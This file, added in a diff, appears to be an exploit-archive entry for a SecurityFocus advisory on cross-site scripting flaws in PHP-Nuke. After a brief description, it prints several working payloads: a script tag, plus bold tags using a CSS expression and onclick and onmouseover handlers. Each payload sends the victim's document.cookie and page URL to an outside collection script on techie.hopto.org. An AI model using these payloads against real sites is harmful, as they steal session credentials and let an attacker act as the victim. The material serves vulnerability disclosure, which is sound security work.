@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/6244/info
+
+everal cross site scripting vulnerabilities have been reported for PHP-Nuke.
+
+An attacker may exploit this vulnerability by enticing a victim user to follow a malicious link. Attacker-supplied HTML and script code may be executed on a web client in the context of the site hosting the web-based forum.
+
+Attackers may potentially exploit this issue to manipulate web content or to steal cookie-based authentication credentials. It may be possible to take arbitrary actions as the victim user.
+
+<SCRIPT>location.href="http://www.techie.hopto.org/fetch.php?
+email=mattmurphy@kc.rr.com&ref="+document.URL+"cookie="+document.cookie;
+
+<B
+STYLE="left:expression(eval('location.href=\'http://www.techie.hopto.org/
+fetch.php?email=mattmurphy@kc.rr.com&ref=\'+document.URL+\'cookie=\'+
+document.cookie'))">Bold text -- or an attack?</B>
+<B
+ONCLICK="location.href='http://www.techie.hopto.org/fetch.php?
+email=mattmurphy@kc.rr.com&ref='+document.URL+'cookie='+document.cookie">
+Don't Click</B>
+<B
+ONMOUSEOVER="location.href='http://www.techie.hopto.org/fetch.php?
+email=mattmurphy@kc.rr.com&ref='+document.URL+'cookie='+document.cookie">Keep
+Away!</B>
